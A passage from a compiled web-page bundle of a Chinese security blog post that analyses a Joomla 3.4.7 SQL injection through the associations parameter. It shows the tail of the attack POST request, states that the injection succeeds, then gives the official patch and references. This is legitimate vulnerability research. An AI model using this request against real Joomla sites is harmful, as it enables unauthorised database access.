operator">.</span>state<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>own<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>create<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>delete<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>state<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>own<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>create<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>delete<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>state<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>own<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>create<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>delete<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>state<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>own<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>create<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>delete<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>state<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>own<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>create<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>delete<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>state<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>own<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>create<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>delete<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>state<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>own<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>create<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>delete<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>state<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>rules<span class="token punctuation">]</span><span class="token punctuation">[</span>core<span class="token operator">.</span>edit<span class="token operator">.</span>own<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>params<span class="token punctuation">]</span><span class="token punctuation">[</span>category_layout<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>params<span class="token punctuation">]</span><span class="token punctuation">[</span>image<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>params<span class="token punctuation">]</span><span class="token punctuation">[</span>image_alt<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&amp;</span>jform<span class="token punctuation">[</span>extension<span class="token punctuation">]</span><span class="token operator">=</span>com_content<span class="token operator">&amp;</span>task<span class="token operator">=</span>category<span class="token operator">.</span>apply<span class="token operator">&amp;</span><span class="token number">2</span>ebbc80d46dda42570c1b1699a58323d<span class="token operator">=</span><span class="token number">1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>jform[associations][en-GB] 这个参数就是 $associations，成功注入。</p><figure><img src="https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/dWuY7g.jpg" alt="Jommla" tabindex="0" loading="lazy"><figcaption>Jommla</figcaption></figure><blockquote><p>这里打一波广告，我们的Skywolf是可以轻松检测出来的，如下图</p></blockquote><figure><img src="https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/vwJyVt.jpg" alt="Skywolf" tabindex="0" loading="lazy"><figcaption>Skywolf</figcaption></figure><p>另外，<code>libraries/legacy/model/admin.php</code> 这里也存在着同样的问题。</p><h3 id="修复方案" tabindex="-1"><a class="header-anchor" href="#修复方案" aria-hidden="true">#</a> 修复方案</h3><p>官方增加了：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token operator">...</span>
<span class="token variable">$associations</span> <span class="token operator">=</span> <span class="token class-name class-name-fully-qualified static-context">Joomla<span class="token punctuation">\\</span>Utilities<span class="token punctuation">\\</span>ArrayHelper</span><span class="token operator">::</span><span class="token function">toInteger</span><span class="token punctuation">(</span><span class="token variable">$associations</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">...</span>
<span class="token variable">$query</span><span class="token operator">-&gt;</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;,&#39;</span> <span class="token operator">.</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">quote</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">associationsContext</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;,&#39;</span> <span class="token operator">.</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">quote</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">...</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>将 $associations 中的所有值转换为int型。还有将 $id 强制转换为int。</p><h2 id="参考资料" tabindex="-1"><a class="header-anchor" href="#参考资料" aria-hidden="true">#</a> 参考资料</h2>`,19),b={href:"http://drops.wooyun.org/papers/11330",target:"_blank",rel:"noopener noreferrer"},v={href:"http://drops.wooyun.org/papers/11371",target:"_blank",rel:"noopener noreferrer"},g={href:"http://bobao.360.cn/learning/detail/2501.html",target:"_blank",rel:"noopener noreferrer"},f={href:"https://github.com/joomla/joomla-cms/commit/2cd4ef682f0cab6ff03200b79007a25f19c6690e",target:"_blank",rel:"noopener noreferrer"},h={href:"https://www.joomla.org/announcements/release-news/5643-joomla-3-4-7.html",target:"_blank",rel:"noopener noreferrer"};function j($,_){const a=l("ExternalLinkIcon");return e(),c("div",null,[r,n("p",null,[s("前一阵子 Joomla 的对象注入很火，而官方3.4.6的修复仅仅是严格过滤了X_FORWARDED_FOR、注释了USER_AGENT存入SESSION那一句，见："),n("a",i,[s("https://github.com/joomla/joomla-cms/commit/995db72ff4eaa544e38b4da3630b7a1ac0146264#diff-aba80b5850bf0435954b29dece250cbfL1021"),p(a)]),s("这样只是指哪补哪，治标不治本。看来官方上次的修复只是临时解决方案，这次的更新(3.4.7)算是彻底解决了此问题。")]),k,n("p",null,[s("搜索一下，发现 JLanguageAssociations 是 Joomla 的一个多语言插件 "),n("a",d,[s("http://www.slideshare.net/erictiggeler/creating-a-multilingual-site-in-joomla-joomla-3-beginners-guide-eric-tiggeler"),p(a)]),s(", 这个插件是 Joomla 自带的，默认没有开启，我们在后台将他开启。")]),m,n("ol",null,[n("li",null,[n("a",b,[s("http://drops.wooyun.org/papers/11330"),p(a)])]),n("li",null,[n("a",v,[s("http://drops.wooyun.org/papers/11371"),p(a)])]),n("li",null,[n("a",g,[s("http://bobao.360.cn/learning/detail/2501.html"),p(a)])]),n("li",null,[n("a",f,[s("https://github.com/joomla/joomla-cms/commit/2cd4ef682f0cab6ff03200b79007a25f19c6690e"),p(a)])]),n("li",null,[n("a",h,[s("https://www.joomla.org/announcements/release-news/5643-joomla-3-4-7.html"),p(a)])])])])}const w=o(u,[["render",j],["__file","Joomla 3.4.7 修复的反序列化与SQL注入.html.vue"]]);export{w as default};
